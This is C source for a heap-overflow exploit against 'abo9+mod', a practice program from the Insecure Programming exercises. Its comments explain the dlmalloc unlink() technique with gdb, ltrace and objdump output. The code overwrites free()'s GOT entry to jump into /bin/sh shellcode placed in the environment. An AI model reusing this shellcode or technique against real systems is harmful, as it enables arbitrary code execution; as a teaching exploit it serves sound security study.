/*
 * $Id: abo9+mod-ex.c,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
 *
 * abo9+mod-ex.c - abo9+mod.c exploit (simple heap ovf)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://community.core-sdi.com/~gera/InsecureProgramming/
 *
 * "Once upon a free()..." (see Phrack#57)
 *
 * This is a basic heap overflow exploit for dlmalloc, based on the unlink()
 * technique. It overflows the first malloc() chunk, corrupting the control 
 * fields (size and prev_size) of the second one and creating a fake chunk. 
 * When the second chunk is free()'ed, the unlink() procedure swaps fields bk 
 * and fd (backward and forward pointers of doubly-linked list of free chunks, 
 * controlled by the attacker) and overwrite arbitrary address in memory. In 
 * this particular case, we choosed to place the free() address (from GOT) in 
 * fd, and the address of shellcode (ret) in GOT. So instead of second free(), 
 * our shellcode will be executed.
 *
 * This is the buffer structure:
 * [Ax256] [FAKE_SIZE] [FAKE_SIZE] [JUNK] [FREE] [ret]
 *
 * $ ltrace abo9+mod
 * [...]
 * malloc(256)                                      = 0x08049658
 * malloc(256)                                      = 0x08049760
 * [...]
 *
 * $ gdb abo9+mod -q
 * (gdb) set arg `perl -e 'printf "ABCD"x65'`
 * (gdb) r
 * Starting program: /home/raptor/devel/abo9+mod `perl -e 'printf "ABCD"x65'`
 *
 * Program received signal SIGSEGV, Segmentation fault.
 * 0x4008a4e5 in free () from /lib/libc.so.6
 * (gdb) x/4 0x08049658+256
 * 0x8049758:      0x44434241      0x44434241      0x00000000      0x00000000
 * (gdb) x 0x8049758
 * 0x8049758:      0x44434241 	# prev_size field of second chunk
 * (gdb) x 0x8049758+4
 * 0x804975c:      0x44434241	# size field of second chunk
 * (gdb) x 0x8049758+8
 * 0x8049760:      0x00000000	# second chunk data begins here
 *
 * $ objdump -R ./abo9+mod | grep free
 * 08049628 R_386_JUMP_SLOT   free
 * ^^^^^^^^\__(this is the free() address in GOT)
 *
 * NOTE: shellcode is modified, 'cause (retaddr + 8) is being written to
 * by unlink() and the content there will be destroyed. So we need to jump
 * 12 bytes ahead, over the destroyed content.
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define JUNK		0xdeadbeef	// size field of fake chunk
#define	FAKE_SIZE	0xfffffffc	// -4 (PREV_INUSE = 0)
#define BUF		277		// 256 + (4 * 5) + 1
#define FREE		0x08049628	// free() address in GOT

char sc[] = /* linux/i386 shellcode (12 + 24 = 36 bytes) */
"\xeb\x0aWHO_CARES?"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char *env[2] = {sc, NULL}; /* put the shellcode in envp */
	char buf[BUF];
	int free_addr = FREE;

	/* address pointer */
	char *ap = buf;

	/* calculate the ret address */
	int ret = 0xbffffffa - strlen(sc) - strlen("./abo9+mod");

	fprintf(stderr, "Using free() address: 0x%X\n", free_addr);
	fprintf(stderr, "Using ret: 0x%X\n", ret);

	/* pad the buffer, filling the first chunk */
	memset(ap, 'A', 256);
	ap += 256;

	/* prev_size field of second chunk */
	*((void **)ap) = (void *)(FAKE_SIZE);
	ap += 4;

	/* size field of second chunk (prev_size field of fake chunk) */
	*((void **)ap) = (void *)(FAKE_SIZE);
	ap += 4;

	/* size field of fake chunk */
	*((void **)ap) = (void *)(JUNK);
	ap += 4;

	/* fd field of second chunk (see solar designer's netscape exploit) */
	*((void **)ap) = (void *)(free_addr - 12);
	ap += 4;

	/* bk field of second chunk (see solar designer's netscape exploit) */
	*((void **)ap) = (void *)(ret);
	ap += 4;

	/* terminate our buffer */
	*ap = 0x0;

	/* run the vulnerable program */
	execle("./abo9+mod", "abo9+mod", buf, NULL, env);
	perror("execle");
}
